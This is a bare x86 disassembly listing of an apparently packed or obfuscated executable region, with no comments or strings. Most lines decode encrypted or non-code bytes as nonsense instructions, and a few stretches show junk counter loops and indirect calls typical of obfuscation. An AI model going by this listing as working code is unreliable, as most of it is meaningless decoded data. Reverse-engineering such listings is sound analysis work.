  4082c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082c2:	xor    al,0xb2
  4082c4:	das    
  4082c5:	ffreep st(4)
  4082c7:	and    al,0x18
  4082c9:	push   es
  4082ca:	sbb    DWORD PTR [ecx+0x434171bb],eax
  4082d0:	add    esp,DWORD PTR [edx]
  4082d2:	cmc    
  4082d3:	in     eax,0x94
  4082d5:	in     eax,dx
  4082d6:	or     DWORD PTR [ebx],esp
  4082d8:	in     al,dx
  4082d9:	mov    edi,0xd3fed4fe
  4082de:	in     al,dx
  4082df:	push   edi
  4082e0:	xor    BYTE PTR [edx+0x1d],dh
  4082e3:	jmp    0xd6d3f23b
  4082e8:	outs   dx,DWORD PTR ds:[esi]
  4082e9:	inc    ecx
  4082ea:	mov    bl,0x87
  4082ec:	aaa    
  4082ed:	inc    esp
  4082ee:	adc    al,0x99
  4082f0:	imul   esp,DWORD PTR [ecx+0x35],0x2981674d
  4082f7:	arpl   cx,dx
  4082f9:	popf   
  4082fa:	and    dh,BYTE PTR [edi-0x29]
  4082fd:	jge    0x408343
  4082ff:	in     eax,dx
  408300:	out    dx,eax
  408301:	ror    dh,cl
  408303:	cmp    cl,cl
  408305:	mov    ds:0x85be204f,eax
  40830a:	repz call 0x22a9828a
  408310:	mov    cl,0xe8
  408312:	(bad)  
  408313:	mov    ebx,0x8430bef9
  408318:	cmp    BYTE PTR ds:0x85f20c78,0x9
  40831f:	clc    
  408320:	es cli 
  408322:	repnz mov esp,0x9da65db2
  408328:	outs   dx,BYTE PTR ds:[esi]
  408329:	sub    eax,0xa4b49560
  40832e:	dec    ebp
  40832f:	dec    edi
  408330:	hlt    
  408331:	push   0xffffff8c
  408333:	jmp    0x29f0:0x16ff638c
  40833a:	lock inc edi
  40833c:	and    al,0x2b
  40833e:	pop    ds
  40833f:	hlt    
  408340:	ins    DWORD PTR es:[edi],dx
  408341:	cmp    BYTE PTR [edi],al
  408343:	data16 adc BYTE PTR [esi+0x6e2c7de5],0x17
  40834b:	repnz cdq 
  40834d:	pop    ebx
  40834e:	(bad)  [esi-0x1a]
  408351:	dec    ecx
  408352:	ja     0x4082fc
  408354:	xor    eax,edx
  408356:	cmp    eax,0x69ca0b32
  40835b:	je     0x4072df
  408361:	mov    eax,DWORD PTR [ebp-0x10]
  408364:	add    DWORD PTR [eax],0x7403504
  40836a:	jmp    0x4072df
  40836f:	mov    eax,DWORD PTR [ebp-0x1c]
  408372:	cmp    DWORD PTR [eax],edi
  408374:	je     0x4072df
  40837a:	mov    eax,0x800f1c81
  40837f:	jmp    0x4072e6
  408384:	push   ebp
  408385:	mov    ebp,esp
  408387:	sub    esp,0x60
  40838a:	mov    DWORD PTR ds:0x4344ef,0x17
  408394:	cmp    DWORD PTR ds:0x4344ef,0x0
  40839b:	je     0x4083fd
  4083a1:	cmp    DWORD PTR ds:0x4344ef,0x6
  4083a8:	jne    0x4083c8
  4083ae:	push   0x434553
  4083b3:	push   0x4c23
  4083b8:	push   0x3f32
  4083bd:	push   0x4c42
  4083c2:	call   DWORD PTR ds:0x413288
  4083c8:	cmp    DWORD PTR ds:0x4344ef,0x7
  4083cf:	jne    0x4083e0
  4083d5:	mov    eax,ds:0x4344ef
  4083da:	dec    eax
  4083db:	mov    ds:0x4344ef,eax
  4083e0:	mov    eax,ds:0x4344ef
  4083e5:	dec    eax
  4083e6:	mov    ds:0x4344ef,eax
  4083eb:	jmp    0x408394
  4083f0:	movzx  eax,BYTE PTR ds:0x434613
  4083f7:	sbb    DWORD PTR ds:0x434503,eax
  4083fd:	mov    eax,DWORD PTR [ebp+0x8]
  408400:	sbb    DWORD PTR ds:0x434587,0x4487
  40840a:	push   ebx
  40840b:	xor    ebx,ebx
  40840d:	or     ebx,DWORD PTR ds:0x434583
  408413:	sbb    DWORD PTR ds:0x434613,ebx
  408419:	push   esi
  40841a:	jmp    0x4086a2
  40841f:	jmp    DWORD PTR [ecx]
  408421:	lahf   
  408422:	xchg   esp,eax
  408423:	mov    eax,ds:0xe73db59c
  408428:	sbb    bh,bl
  40842a:	(bad)  
  40842b:	call   0xfbee8416
  408430:	fidivr WORD PTR [esi+0x7e]
  408433:	loope  0x4084ad
  408435:	jle    0x4084b5
  408437:	popa   
  408438:	int    0xd1
  40843a:	pop    ecx
  40843b:	(bad)  
  40843c:	push   esp
  40843d:	xchg   esp,eax
  40843e:	pop    edi
  40843f:	cs ret 
  408441:	popf   
  408442:	aam    0x16
  408444:	fdivp  st(2),st
  408446:	sbb    al,0x41
  408448:	pusha  
  408449:	adc    al,0x49
  40844b:	cmp    DWORD PTR [ebx+0x3f],edi
  40844e:	daa    
  40844f:	jle    0x40841e
  408451:	or     ebp,esp
  408453:	push   edx
  408454:	xor    cl,ch
  408456:	inc    esp
  408457:	sub    BYTE PTR [eax-0x512e8a61],al
  40845d:	adc    eax,0xd6322b2b
  408462:	scas   eax,DWORD PTR es:[edi]
  408463:	arpl   WORD PTR [ecx],cx
  408465:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408466:	or     eax,0xc3706b6c
  40846b:	aad    0xa2
  40846d:	push   ebp
  40846e:	pop    ecx
  40846f:	call   0xff862b76
  408474:	mov    esp,0xce783f87
  408479:	(bad)  
  40847a:	hlt    
  40847b:	mov    dl,0xd1
  40847d:	js     0x4084de
  40847f:	jo     0x408403
  408481:	cmp    DWORD PTR [ecx-0x56],ecx
  408484:	popa   
  408485:	cwde   
  408486:	sbb    esp,DWORD PTR [ebp+0x55]
  408489:	push   ds
  40848a:	popf   
  40848b:	and    BYTE PTR [esi],dh
  40848d:	gs dec eax
  40848f:	jmp    0x3b87a355
  408494:	pop    edi
  408495:	ror    DWORD PTR [eax],1
  408497:	pop    edi
  408498:	(bad)  
  408499:	inc    ebp
  40849a:	cmp    al,0x12
  40849c:	sub    DWORD PTR [ebx],ebp
  40849e:	ret    
  40849f:	inc    esi
  4084a0:	fbld   TBYTE PTR [ebx+0x12]
  4084a3:	adc    ebx,DWORD PTR [ebx]
  4084a5:	fs dec esp
  4084a7:	fldl2e 
  4084a9:	fldcw  WORD PTR [ebp+0x7a]
  4084ac:	jbe    0x408490
  4084ae:	(bad)  [ecx+0x738a0741]
  4084b4:	bound  esi,QWORD PTR [edx]
  4084b6:	push   0xe4ed3e44
  4084bb:	xchg   ebx,eax
  4084bc:	ins    DWORD PTR es:[edi],dx
  4084bd:	inc    edx
  4084be:	adc    BYTE PTR [ecx],0xe3
  4084c1:	cvtps2pi mm5,QWORD PTR [edx+esi*1]
  4084c5:	dec    eax
  4084c6:	mov    dl,0x3f
  4084c8:	hlt    
  4084c9:	(bad)  
  4084cb:	test   eax,0xa538614e
  4084d0:	xor    al,0xfa
  4084d2:	pop    edi
  4084d4:	push   edx
  4084d5:	and    ebp,DWORD PTR [edi+0x2748b476]
  4084db:	mov    ds:0xaf68564f,eax
  4084e0:	adc    DWORD PTR [eax+0x6380663f],eax
  4084e6:	fldenv [ecx+esi*2-0x4f32d59a]
  4084ed:	xor    DWORD PTR [esi-0x2e],0x19429f8e
  4084f4:	cmc    
  4084f5:	xor    BYTE PTR ds:0xbc2aecd1,ch
  4084fb:	add    DWORD PTR [edi-0x6e7ab8d4],0xf915c26b
  408505:	adc    edx,DWORD PTR [ecx+0x63057594]
  40850b:	sbb    al,0xe4
  40850d:	into   
  40850e:	dec    esp
  40850f:	sub    eax,0x4d859508
  408514:	mov    esp,eax
  408516:	popf   
  408517:	gs sbb edx,0x2a
  40851b:	adc    DWORD PTR [ebx+0x21],0x17
  40851f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408520:	loop   0x40855b
  408522:	push   esi
  408523:	pop    es
  408524:	jge    0x4084cf
  408526:	inc    esp
  408527:	loope  0x408526
  408529:	ret    
  40852a:	add    bl,BYTE PTR [esi-0x4f55871]
  408530:	and    eax,0xafe64db9
  408535:	lods   eax,DWORD PTR ds:[esi]
  408536:	push   ebx
  408537:	add    eax,0x3e174e90
  40853c:	push   DWORD PTR [ebx+ebp*8+0x2c]
  408540:	adc    ch,BYTE PTR [eax+0x4]
  408543:	push   esp
  408544:	inc    esp
  408545:	lahf   
  408546:	ins    DWORD PTR es:[edi],dx
  408547:	mov    esp,0x644bea83
  40854c:	pop    edi
  40854d:	jbe    0x408584
  40854f:	(bad)  
  408550:	cmc    
  408551:	in     al,dx
  408552:	rol    al,cl
  408554:	mov    DWORD PTR [ecx+0x53b6c0a8],edx
  40855a:	sub    al,0x68
  40855c:	mov    cl,0xb2
  40855e:	rol    DWORD PTR [esi+0x5dcecba4],1
  408564:	in     eax,dx
  408565:	cdq    
  408566:	fnstsw WORD PTR [ecx]
  408568:	fisubr DWORD PTR [ecx+0x17f47d21]
  40856e:	pop    esp
  40856f:	pop    esi
  408570:	mov    bl,0x46
  408572:	push   eax
  408573:	xchg   ecx,eax
  408574:	and    DWORD PTR [eax+0x3b],0xb6ba9c08
  40857b:	aaa    
  40857c:	leave  
  40857d:	int3   
  40857e:	dec    esp
  40857f:	fld    DWORD PTR [esp+edi*2+0x11]
  408583:	(bad)  
  408584:	dec    esp
  408585:	add    BYTE PTR [edx-0x72],0xb5
  408589:	scas   eax,DWORD PTR es:[edi]
  40858a:	push   0xe
  40858c:	sbb    BYTE PTR [ecx],dl
  40858e:	xor    bh,bl
  408590:	loopne 0x4085ef
  408592:	in     al,dx
  408593:	pop    ss
  408594:	sub    edi,ecx
  408596:	leave  
  408597:	adc    edx,edi
  408599:	leave  
  40859a:	repz retf 
  40859c:	xchg   ebx,eax
  40859d:	adc    ch,dl
  40859f:	xor    BYTE PTR [eax+0x29ce4f82],ah
  4085a5:	repnz leave 
  4085a7:	rcr    DWORD PTR [ebp+0x4321c492],1
  4085ad:	sbb    dh,cl
  4085af:	or     al,bl
  4085b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085b2:	jge    0x408562
  4085b4:	inc    edx
  4085b5:	pop    ss
  4085b6:	sbb    ch,BYTE PTR [esi-0x62]
  4085b9:	adc    eax,0x2bf2e565
  4085be:	mov    esi,DWORD PTR [ebx-0x9]
  4085c1:	or     dl,cl
  4085c3:	jo     0x408568
  4085c5:	imul   edi,DWORD PTR [ebx-0x4e],0x7c
  4085c9:	sar    BYTE PTR [eax+0x28d1019],1
  4085cf:	rol    BYTE PTR ds:0x6c7d299,1
  4085d5:	xor    al,0x41
  4085d7:	shr    BYTE PTR [esi-0x31],cl
  4085da:	mov    DWORD PTR [ebp-0x79b15f81],edx
  4085e0:	jb     0x408604
  4085e2:	dec    esi
  4085e3:	ret    0xc9e1
  4085e6:	das    
  4085e7:	in     al,0xe7
  4085e9:	data16 aas 
  4085eb:	and    bl,ah
  4085ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085ee:	int    0x45
  4085f0:	addr16 xchg ebx,eax
  4085f2:	push   ecx
  4085f3:	pop    es
  4085f4:	pop    esp
  4085f5:	mov    dl,0xab
  4085f7:	arpl   WORD PTR [eax],sp
  4085f9:	xchg   ebx,eax
  4085fa:	pusha  
  4085fb:	sbb    al,BYTE PTR [edi-0x11f31b01]
  408601:	and    DWORD PTR [eax+ecx*2],0x20
  408605:	jg     0x40865b
  408607:	sub    bl,BYTE PTR [edi+0x53]
  40860a:	add    al,0x56
  40860c:	or     al,BYTE PTR [edx]
  40860e:	pusha  
  40860f:	add    bh,BYTE PTR [eax+ebp*1+0x4e]
  408613:	adc    DWORD PTR [eax-0x77],edi
  408616:	jg     0x4085e7
  408618:	sub    cl,ah
  40861a:	lea    esi,[edx-0x733f7a68]
  408620:	int    0xd7
  408622:	adc    BYTE PTR [ecx-0x6a82367],bl
  408628:	div    BYTE PTR [eax]
  40862a:	repnz mov ch,bh
  40862d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40862e:	sub    eax,0x5764b361
  408633:	jae    0x4085c2
  408635:	sub    eax,0x80379604
  40863a:	cmp    ch,BYTE PTR ds:0xe9a5c1a7
  408640:	jp     0x408686
  408642:	and    BYTE PTR [esi+ebp*1+0x15],dh
  408646:	scas   eax,DWORD PTR es:[edi]
  408647:	mov    dl,0x11
  408649:	mov    edi,0xea534d7d
  40864e:	xor    esi,edi
  408650:	call   0x61b5:0xec564c41
  408657:	mov    esp,0x64c8dbd2
  40865c:	ins    BYTE PTR es:[edi],dx
  40865d:	push   ds
  40865e:	dec    edi
  40865f:	mov    dh,0xab
  408661:	mov    edi,0x3d79eb6a
  408666:	int3   
  408667:	shl    BYTE PTR [ecx-0x19da656a],0x70
  40866e:	int    0x95
  408670:	inc    edx
  408671:	mov    dh,BYTE PTR [ebx-0x43f1da6]
  408677:	xchg   edx,eax
  408678:	xchg   ebp,eax
  408679:	jae    0x40864b
  40867b:	lds    ebp,FWORD PTR [edi-0x72c627b7]
  408681:	iret   
  408682:	jmp    0x3db2:0x624e2d68
  408689:	repnz add ah,BYTE PTR [edx+0x72ebee5f]
  408690:	std    
  408691:	mov    eax,0x991b138a
  408696:	fldcw  WORD PTR [edx]
  408698:	in     eax,0x62
  40869a:	adc    dl,BYTE PTR [edx-0x28]
  40869d:	es pop ebx
  40869f:	scas   eax,DWORD PTR es:[edi]
  4086a0:	dec    DWORD PTR [esi+edi*4]
  4086a3:	push   ecx
  4086a4:	or     BYTE PTR [ecx+0x7],dl
  4086a7:	and    DWORD PTR ds:0x4344ef,0x0
  4086b1:	mov    ebx,DWORD PTR ds:0x4344ef
  4086b7:	inc    ebx
  4086b8:	mov    DWORD PTR ds:0x4344ef,ebx
  4086be:	cmp    DWORD PTR ds:0x4344ef,0x8
  4086c5:	jne    0x4086d6
  4086cb:	push   0x2214
  4086d0:	call   DWORD PTR ds:0x41328c
  4086d6:	cmp    DWORD PTR ds:0x4344ef,0x7
  4086dd:	jne    0x4086f2
  4086e3:	xor    ebx,ebx
  4086e5:	or     ebx,DWORD PTR ds:0x4344ef
  4086eb:	inc    ebx
  4086ec:	mov    DWORD PTR ds:0x4344ef,ebx
  4086f2:	cmp    DWORD PTR ds:0x4344ef,0x11
  4086f9:	jb     0x4086b1
  4086ff:	xor    eax,esi
  408701:	or     ebx,0x4275
  408707:	mov    ebx,0x327299
  40870c:	add    eax,ebx
  40870e:	push   edi
  40870f:	sub    edi,DWORD PTR ds:0x434583
  408715:	mov    DWORD PTR [ebp-0x18],eax
  408718:	xor    edi,0x561f
  40871e:	jmp    0x4089a6
  408723:	push   esi
  408724:	ja     0x40875d
  408726:	push   ecx
  408727:	aaa    
  408728:	push   ecx
  408729:	jo     0x40879c
  40872b:	(bad)  
  40872c:	mov    eax,0x88ac3fc8
  408731:	(bad)
  408735:	jle    0x4087b5
  408737:	loope  0x4087b1
  408739:	jle    0x4087b9
  40873b:	inc    ecx
  40873c:	fwait
  40873d:	stos   DWORD PTR es:[edi],eax
  40873e:	rol    DWORD PTR [edi-0x1],cl
  408741:	rcl    ebp,cl
  408743:	call   0x65bd90bf
  408748:	and    ebp,DWORD PTR ds:0x885a16ac
  40874e:	test   al,0x77
  408750:	leave  
  408751:	shrd   edi,ebx,0xaa
  408755:	or     al,BYTE PTR [ebx+0x28]
  408758:	dec    esi
  408759:	push   es
  40875a:	sub    eax,0x25879873
  40875f:	shl    BYTE PTR [ebp+0x58a5a641],cl
  408765:	xchg   edx,eax
  408766:	cmp    al,0x54
  408768:	and    al,0x68
  40876a:	xchg   edx,eax
  40876b:	sysret 
  40876d:	mov    bh,ah
  40876f:	xchg   esp,eax
  408770:	in     al,0x72
  408772:	inc    ch
  408774:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408775:	push   ecx
  408776:	repnz or al,0xf8
  408779:	add    BYTE PTR [edx-0x58826c15],dh
  40877f:	xchg   edx,eax
  408780:	pop    edx
  408781:	das    
  408782:	jmp    0x4c52:0xf239d959
  408789:	pop    ds
  40878a:	and    BYTE PTR [eax],bh
  40878c:	jmp    0x408731
  40878e:	loop   0x4087d5
  408790:	aas    
  408791:	sub    DWORD PTR [ebx+0x38],ecx
  408794:	push   edi
  408795:	rol    ch,1
  408797:	nop
  408798:	xchg   ebx,eax
  408799:	mov    ebp,0x37f5320f
  40879e:	mov    esp,0xd6efad0c
  4087a3:	(bad)  
  4087a5:	pushf  
  4087a6:	cmp    edi,DWORD PTR [ebx-0x7dbba2c1]
  4087ac:	push   esi
  4087ad:	add    BYTE PTR fs:[bx+di],ch
  4087b1:	das    
  4087b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087b3:	mov    eax,ds:0x1f6fd67f
  4087b8:	ins    DWORD PTR es:[edi],dx
  4087b9:	cmp    eax,0xe25e9e10
  4087be:	outs   dx,DWORD PTR ds:[esi]
  4087bf:	and    eax,0x5d2045b8
  4087c4:	jmp    0x408763
  4087c6:	dec    edx
  4087c7:	xchg   edx,eax
  4087c8:	inc    edi
  4087c9:	add    dh,dh
  4087cb:	lock rol BYTE PTR [edi+0x218a0e62],cl
  4087d2:	out    0xb4,eax
  4087d4:	xchg   edi,eax
  4087d5:	jl     0x408765
  4087d7:	cmp    eax,0x713302ea
  4087dc:	mov    DWORD PTR [esi],0xef0d0357
  4087e2:	test   eax,0x28c1424
  4087e7:	mov    al,ds:0x5589a432
  4087ec:	xchg   edx,eax
  4087ed:	xchg   esp,eax
  4087ee:	adc    eax,0x93d95f6
  4087f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087f4:	mov    ?,WORD PTR [esi-0x18]
  4087f7:	pop    edi
  4087f8:	mov    dl,0xc0
  4087fa:	xor    BYTE PTR [ecx-0x79],0x88
  4087fe:	stos   DWORD PTR es:[edi],eax
  4087ff:	mov    ebx,0x3a78f2c1
  408804:	daa    
  408805:	retf   0x3568
  408808:	push   edx
  408809:	lahf   
  40880a:	sub    cl,dh
  40880c:	mov    al,0xd5
  40880e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40880f:	in     al,dx
  408810:	mov    ah,0x22
  408812:	mov    ecx,0xd2c1e530
  408817:	aad    0xa7
  408819:	pop    ebx
  40881a:	rcr    al,cl
  40881c:	int    0xee
  40881e:	add    edi,DWORD PTR [edi]
  408820:	cdq    
  408821:	push   ss
  408822:	pop    esi
  408823:	stos   DWORD PTR es:[edi],eax
  408824:	jo     0x4087b9
  408826:	mov    ch,al
  408828:	iret   
  408829:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40882a:	mov    DWORD PTR [ebx],edx
  40882c:	xor    al,0x25
  40882e:	mov    ah,0x16
  408830:	test   al,0x22
  408832:	in     al,0x1a
  408834:	int    0x8e
  408836:	add    dl,BYTE PTR [ecx+0x73]
  408839:	gs push cs
  40883b:	or     DWORD PTR [ebx+0x1efca1fb],ebx
  408841:	mov    esi,0x9adf245d
  408846:	and    al,0x47
  408848:	fucom  st(6)
  40884a:	adc    BYTE PTR [eax-0x65f1a6f2],dh
  408850:	test   edx,esp
  408852:	loopne 0x408826
  408854:	lds    eax,FWORD PTR [edx+edx*1+0x1d]
  408858:	mov    cl,0xb8
  40885a:	xor    ebx,eax
  40885c:	mov    ds:0xccb7c01d,eax
  408861:	(bad)  [ebp-0x4f63201]
  408867:	lods   al,BYTE PTR ds:[esi]
  408868:	jmp    0xde52:0x776d5cba
  40886f:	cmp    DWORD PTR [ecx],esp
  408871:	jo     0x408868
  408873:	loopne 0x408855
  408875:	jno    0x408822
  408877:	xchg   ebx,eax
  408878:	inc    edx
  408879:	test   eax,0xfd162255
  40887e:	(bad)  
  40887f:	(bad)  
  408880:	sbb    esp,edx
  408882:	dec    ecx
  408883:	add    ebx,DWORD PTR [ebp-0x40991f13]
  408889:	pop    esp
  40888a:	sub    BYTE PTR [edi+esi*1],ch
  40888d:	jns    0x408824
  40888f:	in     eax,0xa5
  408891:	(bad)  
  408892:	jns    0x4088b6
  408894:	aad    0xaa
  408896:	call   0x32aaefb2
  40889b:	sti    
  40889c:	xor    ah,dl
  40889e:	aad    0xe4
  4088a0:	sub    BYTE PTR [edi+0x701096de],dh
  4088a6:	mov    al,0xd0
  4088a8:	arpl   WORD PTR [edi+0x14d2cc14],cx
  4088ae:	xor    BYTE PTR [edx+0x64c21919],ch
  4088b4:	lahf   
  4088b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088b6:	(bad)  
  4088b7:	sbb    BYTE PTR [esi+esi*2],bh
  4088ba:	push   edx
  4088bb:	sbb    DWORD PTR [ebx],eax
  4088bd:	jg     0x4088f5
  4088bf:	mov    ah,0x49
  4088c1:	cli    
  4088c2:	outs   dx,DWORD PTR ds:[esi]
  4088c3:	fnstenv [edi]
  4088c5:	lods   al,BYTE PTR ds:[esi]
  4088c6:	fiadd  WORD PTR [esi-0x56cd1071]
  4088cc:	outs   dx,BYTE PTR ds:[esi]
  4088cd:	pusha  
  4088ce:	mov    ah,0xea
  4088d0:	and    bh,BYTE PTR [esp+edx*4-0x1b]
  4088d4:	js     0x408860
  4088d6:	into   
  4088d7:	ins    BYTE PTR es:[edi],dx
  4088d8:	jg     0x4088f3
  4088da:	xor    al,0x48
  4088dc:	jae    0x40895c
  4088de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088df:	sti    
  4088e0:	mov    cl,0xfc
  4088e2:	int3   
  4088e3:	(bad)  
  4088e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088e5:	dec    eax
  4088e6:	add    eax,0x21b8551
  4088eb:	stc    
  4088ec:	out    0xd3,eax
  4088ee:	xor    DWORD PTR [edi+0x45],esi
  4088f1:	popf   
  4088f2:	fadd   DWORD PTR [ebx]
  4088f4:	imul   esi,DWORD PTR [edi],0x136e9b04
  4088fa:	mov    al,ds:0x4a7f241a
  4088ff:	and    eax,0xdffd9334
  408904:	cmp    al,0x6d
  408906:	call   0xf490:0x64ae4cec
  40890d:	pop    edx
  40890e:	div    DWORD PTR ds:0xc4ac57d7
  408914:	(bad)  
  408915:	loop   0x40898a
  408917:	leave  
  408918:	ja     0x4088f1
  40891a:	and    cl,dl
  40891c:	mov    ah,0x93
  40891e:	mov    eax,ds:0xb73244b0
  408923:	xchg   ecx,eax
  408924:	mov    ebx,0x31a5a777
  408929:	addr16 cmp esp,eax
  40892c:	adc    ebx,DWORD PTR [ebx-0x23c34fa0]
  408932:	fimul  WORD PTR [ecx-0x1776b144]
  408938:	push   esp
  408939:	jmp    0x154168ca
  40893e:	jbe    0x4089b4
  408940:	xchg   DWORD PTR [edx+0x43],edi
  408943:	in     eax,0x93
  408945:	jo     0x408939
  408947:	mov    al,ds:0xfd088de4
  40894c:	or     ecx,DWORD PTR [eax]
  40894e:	inc    ebx
  40894f:	imul   ebp,DWORD PTR ds:[edi-0x4d],0xfffffff9
  408954:	cmc    
  408955:	mov    ds:0xea041e81,eax
  40895a:	mov    eax,ds:0xe0e2dd2b
  40895f:	int3   
  408960:	pop    edx
  408961:	and    DWORD PTR gs:[esi-0xd01c2b],ebx
  408968:	call   0x802f3308
  40896d:	or     dl,bl
  40896f:	jmp    0x40893c
  408971:	mov    ebx,DWORD PTR [eax-0x5c]
  408974:	mov    bh,0x12
  408976:	lods   eax,DWORD PTR ds:[si]
  408978:	jmp    0x87d4e282
  40897d:	scas   al,BYTE PTR es:[edi]
  40897e:	bound  ebp,QWORD PTR [edi+0x67]
  408981:	add    DWORD PTR [edx-0x70844020],0xadebb11c
  40898b:	in     al,dx
  40898c:	adc    al,0x8d
  40898e:	stc    
  40898f:	sub    ebx,eax
  408991:	outs   dx,BYTE PTR ds:[esi]
  408992:	adc    bl,ah
  408994:	retf   0x8877
  408997:	icebp  
  408998:	cmp    edx,DWORD PTR [ebx+eiz*2+0x57]
  40899c:	into   
  40899d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40899e:	sub    esi,DWORD PTR [edx+0x50]
  4089a1:	lahf   
  4089a2:	getsec 
  4089a4:	jmp    0xfe33:0x87d8b4e
  4089ab:	not    DWORD PTR ds:0x4344eb
  4089b1:	mov    DWORD PTR [ebp-0xc],0xf89c85f6
  4089b8:	mov    DWORD PTR [ebp-0x10],0xf89c8736
  4089bf:	add    edi,ebx
  4089c1:	jmp    0x4092cd
  4089c6:	cmp    edi,0x3f
  4089c9:	jmp    0x408c51
  4089ce:	adc    dl,BYTE PTR [ebx-0x524adccb]
  4089d4:	sbb    al,0xb3
  4089d6:	xchg   ebx,eax
  4089d7:	pop    ds
  4089d8:	adc    cl,cl
  4089da:	mov    DWORD PTR [edi],eax
  4089dc:	(bad)  
  4089dd:	fcmovbe st,st(1)
  4089df:	fstp   TBYTE PTR [esi+0x7e]
  4089e2:	loope  0x408a5c
  4089e4:	jle    0x408a64
  4089e6:	mov    esi,0x558ccf23
  4089eb:	xor    ebp,ebx
  4089ed:	ret    0x6128
  4089f0:	and    eax,0xb6f63382
  4089f5:	mov    DWORD PTR [edx],eax
  4089f7:	pop    esp
  4089f8:	retf   
  4089f9:	push   es
  4089fa:	mov    bh,0xd5
  4089fc:	jnp    0x408a0f
  4089fe:	fcomp  DWORD PTR [eax]
  408a00:	or     DWORD PTR [ebp-0x3d8f589b],0xffffffab
  408a07:	or     al,0x50
  408a09:	rcl    DWORD PTR [eax],1
  408a0b:	pop    edi
  408a0c:	dec    ebp
  408a0d:	push   0x3fa57d61
  408a12:	mov    ebp,DWORD PTR [eax-0x34364796]
  408a18:	fwait
  408a19:	pusha  
  408a1a:	mov    dh,ah
  408a1c:	ds inc esi
  408a1e:	xchg   ecx,eax
  408a1f:	jns    0x4089c5
  408a21:	in     al,0xdd
  408a23:	hlt    
  408a24:	inc    ecx
  408a25:	sbb    dl,BYTE PTR [ebx-0x671ca221]
  408a2b:	xchg   ecx,eax
  408a2c:	fs test eax,0xe3b56aef
  408a32:	xchg   ebx,eax
  408a33:	test   al,0x75
  408a35:	inc    ecx
  408a36:	in     eax,0xb2
  408a38:	cmp    eax,0xf391e2fc
  408a3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a3e:	ins    BYTE PTR es:[edi],dx
  408a3f:	inc    edx
  408a40:	pop    ecx
  408a41:	out    0xcc,eax
  408a43:	inc    ebx
  408a44:	mov    BYTE PTR [edx],al
  408a46:	xchg   ecx,eax
  408a47:	xlat   BYTE PTR ds:[ebx]
  408a48:	inc    ecx
  408a49:	dec    edx
  408a4a:	or     ah,BYTE PTR [eax+0x79]
  408a4d:	ror    DWORD PTR [edx-0x31972056],1
  408a53:	int    0x1f
  408a55:	sbb    BYTE PTR [edi],ch
  408a57:	enter  0x99bf,0xbd
  408a5b:	arpl   WORD PTR [ebx],cx
  408a5d:	pop    edi
  408a5e:	mov    WORD PTR [edi+0x34],ds
  408a61:	xchg   edi,eax
  408a62:	jg     0x408a23
  408a64:	je     0x408a17
  408a66:	adc    eax,eax
  408a68:	pop    edi
  408a69:	pop    DWORD PTR [ecx]
  408a6b:	into   
  408a6c:	stos   BYTE PTR es:[edi],al
  408a6d:	xchg   ebp,eax
  408a6e:	out    dx,al
  408a6f:	(bad)  
  408a70:	aad    0x3a
  408a72:	icebp  
  408a73:	test   DWORD PTR [eax-0x24],0x4bdbbc42
  408a7a:	test   al,0xfa
  408a7c:	fsubrp st(2),st
  408a7e:	outs   dx,BYTE PTR ds:[esi]
  408a7f:	out    dx,al
  408a80:	daa    
  408a81:	xchg   edx,eax
  408a82:	shl    dl,cl
  408a84:	dec    esp
  408a85:	xor    eax,0xcb0abbf5
  408a8a:	mov    WORD PTR [ebp+0x172d52ea],ds
  408a90:	rcl    DWORD PTR [ebx-0x4d],cl
  408a93:	mov    al,ds:0xfc04c69e
  408a98:	pop    es
  408a99:	lods   eax,DWORD PTR ds:[esi]
  408a9a:	jns    0x408ab8
  408a9c:	std    
  408a9d:	stc    
  408a9e:	push   eax
  408a9f:	scas   al,BYTE PTR es:[edi]
  408aa0:	mul    ch
  408aa2:	inc    eax
  408aa3:	or     al,0xe6
  408aa5:	(bad)  
  408aa6:	(bad)  
  408aa7:	xchg   ebx,eax
  408aa8:	add    ecx,edi
  408aaa:	xor    al,0xf2
  408aac:	fstp   TBYTE PTR [ecx+0x6e1e7c4a]
  408ab2:	xchg   BYTE PTR [esi+0x5edc6e64],al
  408ab8:	push   ds
  408ab9:	pop    es
  408aba:	not    esi
  408abc:	adc    DWORD PTR [esi-0x1e],edi
  408abf:	lahf   
  408ac0:	pop    es
  408ac1:	leave  
  408ac2:	retf   0x5685
  408ac5:	ss (bad) 
  408ac7:	push   ebx
  408ac8:	cmp    cl,BYTE PTR [ecx-0x37]
  408acb:	or     edx,DWORD PTR [ebx-0x5458229f]
  408ad1:	mov    fs,ebx
  408ad3:	jns    0x408a79
  408ad5:	fisub  DWORD PTR [edi+0x60]
  408ad8:	pop    ebx
  408ad9:	jg     0x408ad8
  408adb:	jae    0x408aaa
  408add:	sbb    DWORD PTR [eax+edx*1-0x4],ecx
  408ae1:	ja     0x408ad9
  408ae3:	loope  0x408a95
  408ae5:	pop    edi
  408ae6:	ins    DWORD PTR es:[edi],dx
  408ae7:	add    dh,BYTE PTR [edi-0x16]
  408aea:	int    0x2a
  408aec:	or     esp,esp
  408aee:	into   
  408aef:	adc    BYTE PTR [eax+0x4d],bh
  408af2:	adc    esp,eax
  408af4:	ret    0xe6bf
  408af7:	jb     0x408a99
  408af9:	pop    ds
  408afa:	xchg   esi,eax
  408afb:	cmp    ebx,DWORD PTR [esi+edi*4]
  408afe:	fcmovb st,st(2)
  408b00:	mov    bh,0x46
  408b02:	mov    esp,0x1551d483
  408b07:	push   es
  408b08:	dec    edi
  408b09:	jno    0x408afe
  408b0b:	int3   
  408b0c:	sub    al,0x6d
  408b0e:	leave  
  408b0f:	sti    
